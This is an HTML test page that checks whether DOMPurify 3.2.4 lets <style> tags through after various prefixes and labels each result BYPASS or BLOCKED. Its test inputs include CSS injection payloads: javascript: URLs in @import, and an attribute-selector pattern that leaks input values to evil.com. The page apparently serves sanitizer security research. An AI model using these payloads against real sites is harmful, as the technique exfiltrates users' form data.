<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>DOMPurify CSS Bypass — Browser vs JSDOM Check</title>
<style>body { font-family: monospace; background: #111; color: #ddd; padding: 2em; } pre { background: #1a1a2e; padding: 1em; border-radius: 4px; }</style>
</head>
<body>
<h1>DOMPurify CSS Bypass — Browser Test</h1>
<pre id="out">Loading DOMPurify CDN...</pre>

<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js"></script>
<script>
const out = document.getElementById('out');
let log = `DOMPurify version: ${DOMPurify.version}\nUser-Agent: ${navigator.userAgent}\n\n`;

const tests = [
  '<style>@import url("javascript:x");</style>',
  'x<style>@import url("javascript:x");</style>',
  '<div></div><style>@import url("javascript:x");</style>',
  '<br><style>@import url("javascript:x");</style>',
  'Hello<style>input[value^="a"] ~ * { background: url(evil.com/a) }</style>',
  '<style>input[value^="a"] ~ * { background: url(evil.com/a) }</style>',
  'x<style>body { background: url("javascript:x") }</style>',
  'x<style>@import url("https://evil.com/steal.css");</style>',
];

for (const input of tests) {
  const sanitized = DOMPurify.sanitize(input);
  const hasStyle = sanitized.includes('<style>');
  const prefix = input.match(/^(.*?)<style>/)?.[1] || '(none)';
  log += `${hasStyle ? 'BYPASS' : 'BLOCKED'} | prefix="${prefix}"\n`;
  log += `  in:  ${input.substring(0, 80)}\n`;
  log += `  out: ${sanitized.substring(0, 80) || '(empty)'}\n\n`;
}

out.textContent = log;
</script>
</body>
</html>
